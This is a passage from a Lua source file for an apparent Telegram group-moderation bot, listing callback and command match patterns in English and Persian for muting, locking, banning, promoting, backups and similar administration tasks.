"^###cb:(+1FloodTime):(.*)$", "^###cb:(+5FloodTime):(.*)$", "^###cb:(NumberSettings):(.*)$", "^###cb:(Manager):(.*)$", "^###cb:(Exit):(.*)$", "^###cb:(mute_all):(.*)$", "^###cb:(mute_gif):(.*)$", "^###cb:(mute_text):(.*)$", "^###cb:(mute_photo):(.*)$", "^###cb:(mute_video):(.*)$", "^###cb:(mute_audio):(.*)$", "^###cb:(mute_voice):(.*)$", "^###cb:(mute_sticker):(.*)$", "^###cb:(mute_contact):(.*)$", "^###cb:(mute_forward):(.*)$", "^###cb:(mute_location):(.*)$", "^###cb:(mute_document):(.*)$", "^###cb:(mute_tgservice):(.*)$", "^###cb:(mute_inline):(.*)$", "^###cb:(mute_game):(.*)$", "^###cb:(mute_keyboard):(.*)$", "^###cb:(lock_link):(.*)$", "^###cb:(lock_tag):(.*)$", "^###cb:(lock_username):(.*)$", "^###cb:(lock_join):(.*)$", "^###cb:(lock_mention):(.*)$", "^###cb:(lock_arabic):(.*)$", "^###cb:(lock_edit):(.*)$", "^###cb:(lock_spam):(.*)$", "^###cb:(lock_flood):(.*)$", "^###cb:(lock_bots):(.*)$", "^###cb:(lock_markdown):(.*)$", "^###cb:(lock_webpage):(.*)$", "^###cb:(lock_pin):(.*)$", "^###cb:(lock_MaxWords):(.*)$", "^###cb:(lock_botchat):(.*)$", "^###cb:(lock_fohsh):(.*)$", "^###cb:(lock_english):(.*)$", "^###cb:(lock_forcedinvite):(.*)$"}
, 
patterns = {_config.cmd .. "([Ii]d)$", "^(آیدی)$", "^(ایدی)$", _config.cmd .. "([Vv]ip)$", _config.cmd .. "([Vv]ip) (.*)$", _config.cmd .. "([Ii]nstall)$", "^(نصب گروه)$", _config.cmd .. "([Ii]nstall) (%d+)$", "^(نصب گروه) (%d+)$", _config.cmd .. "([Rr]emove)$", "^(حذف گروه)$", _config.cmd .. "([Rr]emove) (.*)$", "^(حذف گروه) (.*)$", _config.cmd .. "([Ii]d) (.*)$", "^(آیدی) (.*)$", _config.cmd .. "([Ss]et[Cc]hannel) (.*)", "^(تنظیم کانال) (.*)", _config.cmd .. "([Pp]in)$", "^(پین)$", _config.cmd .. "([Uu]npin)$", "^(برداشتن پین)$", "^(آنپین)$", _config.cmd .. "([Ss]etowner)$", "^(تنظیم مالک)$", _config.cmd .. "([Ss]etowner) (.*)$", "^(تنظیم مالک) (.*)$", _config.cmd .. "([Rr]emowner)$", "^(حذف مالک)$", _config.cmd .. "([Rr]emowner) (.*)$", "^(حذف مالک) (.*)$", _config.cmd .. "([Pp]romote)$", "^(ارتقا)$", _config.cmd .. "([Pp]romote) (.*)$", "^(ارتقا) (.*)$", _config.cmd .. "([Dd]emote)$", "^(تنزیل)$", _config.cmd .. "([Dd]emote) (.*)$", "^(تنزیل) (.*)$", _config.cmd .. "([Mm]odlist)$", "^(لیست مدیران)$", _config.cmd .. "([Oo]wnerlist)$", "^(لیست مالکان)$", _config.cmd .. "([Ll]ock) (.*)$", "^(قفل) (.*)$", _config.cmd .. "([Uu]n[Ll]ock) (.*)$", "^(باز کردن) (.*)$", _config.cmd .. "([Ll]ink)$", "^(لینک گروه)$", _config.cmd .. "([Ll]ink) (pv)$", "^(لینک گروه) (پیوی)$", _config.cmd .. "([Ss]etlink)$", "^(تنظیم لینک)$", _config.cmd .. "([Ss]etlink) (.*)$", "^(تنظیم لینک) (.*)$", _config.cmd .. "([Nn]ewlink)$", "^(لینک جدید)$", _config.cmd .. "([Nn]ewlink) (pv)$", "^(لینک جدید) (پیوی)$", _config.cmd .. "([Rr]ules)$", "^(قوانین)$", _config.cmd .. "([Ss]ettings)$", "^(تنظیمات)$", _config.cmd .. "([Ss]etrules) (.*)$", "^(تنظیم قوانین) (.*)$", _config.cmd .. "([Ss]etname) (.*)$", "^(تنظیم نام) (.*)$", _config.cmd .. "([Cc]lean) (.*)$", "^(پاکسازی) (.*)$", _config.cmd .. "([Ss]etflood) (%d+)$", "^(تنظیم حساسیت پیام رگباری) (%d+)$", _config.cmd .. "([Uu]nblock) (.*)$", "^(آزاد سازی) (.*)$", _config.cmd .. "([Rr]es) (.*)$", "^(اطلاعات) (.*)$", _config.cmd .. "([Aa]ccess) (.*)$", "^(دسترسی) (.*)$", _config.cmd .. "([Ss]etlang) (.*)$", "^(تغییر زبان) (.*)$", _config.cmd .. "([Ff]ilterlist)$", "^(لیست فیلتر)$", _config.cmd .. "([Ss]etwelcome) (.*)$", "^(تنظیم خوش آمد گویی) (.*)$", _config.cmd .. "([Ww]elcome) (.*)$", "^(خوش آمد گویی) (.*)$", _config.cmd .. "([Mm]ute) (.*) (%d+)$", "^(میوت) (.*) (%d+)$", _config.cmd .. "([Mm]ute) (.*)$", "^(میوت) (.*)$", _config.cmd .. "([Uu]nmute) (.*) (%d+)$", "^(آنمیوت) (.*) (%d+)$", _config.cmd .. "([Uu]nmute) (.*)$", "^(آنمیوت) (.*)$", _config.cmd .. "([Mm]ymute)$", "^(میوت من)$", _config.cmd .. "([Mm][Mm])$", _config.cmd .. "([Cc]mds)$", "^(دستورات)$", _config.cmd .. "([Bb]ackup)$", "^(بک آپ)$", _config.cmd .. "([Gg]et[Bb]ackup)$", "^(استفاده از بک آپ)$", _config.cmd .. "([Gg]et[Bb]ackup) (.*)$", "^(استفاده از بک آپ) (.*)$", _config.cmd .. "([Pp]hoto[Ii]d) (.*)$", "^(عکس آیدی) (.*)$", _config.cmd .. "([Ss]et[Mm]ax[Ww]arn) (%d+)", "^(تنظیم حداکثر اخطار) (%d+)$", _config.cmd .. "([Ii]nvite[Kk]icked)$", "^(دعوت اخراج شده ها)$", _config.cmd .. "([Ss]et[Ff]lood[Tt]ime) (%d+)$", "^(تنظیم زمان پیام رگباری) (%d+)$", _config.cmd .. "([Ss]et[Ff]orced[Ii]nvite) (%d+)$", "^(تنظیم دعوت اجباری) (%d+)$", _config.cmd .. "([Aa]dd[Ss]ettings) (.*)$", "^(اضافه کردن تنظیمات) (.*)$", _config.cmd .. "([Dd]el[Ss]ettings) (.*)$", "^(حذف تنظیمات) (.*)$", _config.cmd .. "([Mm]anager)$", "^(مدیریت)$", _config.cmd .. "([Mm]axchat) (%d+)$", _config.cmd .. "([Ll]ock[Gg]roup) (%d+:%d+) (%d+:%d+)$", _config.cmd .. "([Ll]ock[Gg]roup) (%d+)(.*)$", _config.cmd .. "([Uu]nlock[Gg]roup)$", _config.cmd .. "([Ee]dit[Bb]ot) (%d+) (.*)$", _config.cmd .. "([Ee]dit[Bb]ot) (all) (help)$", _config.cmd .. "([Ss]ense) (.*)$", _config.cmd .. "([Ss]udo[Aa]ccess) (%d+) (.*)$", _config.cmd .. "([Ss]et[Ss]udo) (.*)$", _config.cmd .. "([Ss]et[Ss]udo)$", _config.cmd .. "(checkupdate)$", _config.cmd .. "(forceupdate)$", _config.cmd .. "([Ss]end[Pp]m) (.*)$", _config.cmd .. "([Ss]end[Pp]m[Tt]o) (%d+) (.*)$", _config.cmd .. "([Bb]anall)$", _config.cmd .. "([Bb]anall) (.*)$", _config.cmd .. "([Uu]nbanall)$", _config.cmd .. "([Uu]nbanall) (.*)$", _config.cmd .. "([Gg]banlist)$", _config.cmd .. "([Bb]an)$", _config.cmd .. "([Ss]et[Mm]ax[Ww]ords) (%d+)$", _config.cmd .. "([Bb]an) (.*)$", _config.cmd .. "([Uu]nban)$", _config.cmd .. "([Uu]nban) (.*)$", _config.cmd .. "([Bb]anlist)$", _config.cmd .. "([Ss]ilent)$", _config.cmd .. "([Ss]ilent) (.*)$", _config.cmd .. "([Uu]nsilent)$", _config.cmd .. "([Uu]nsilent) (.*)$", _config.cmd .. "([Ss]ilentlist)$", _config.cmd .. "([Kk]ick)$", _config.cmd .. "([Kk]ick) (.*)$", _config.cmd .. "([Dd]elall)$", _config.cmd .. "([Dd]elall) (.*)$", _config.cmd .. "([Ff]ilter) (.*)$", _config.cmd .. "([Aa]dd[Rr]eply) {(.*)} (.*)", _config.cmd .. "([Dd]el[Rr]eply) {(.*)} (.*)", _config.cmd .. "([Aa]ll[Rr]eply) {(.*)}", _config.cmd .. "([Rr]eply[Aa]ccess) {(.*)} (.*)", _config.cmd .. "([Aa]llow) (.*)$", _config.cmd .. "([Aa]llow)$", _config.cmd .. "([Aa]llow[Ll]ist)$", _config.cmd .. "([Rr]eload)$", _config.cmd .. "([Rr]eport)$", _config.cmd .. "([Rr]epor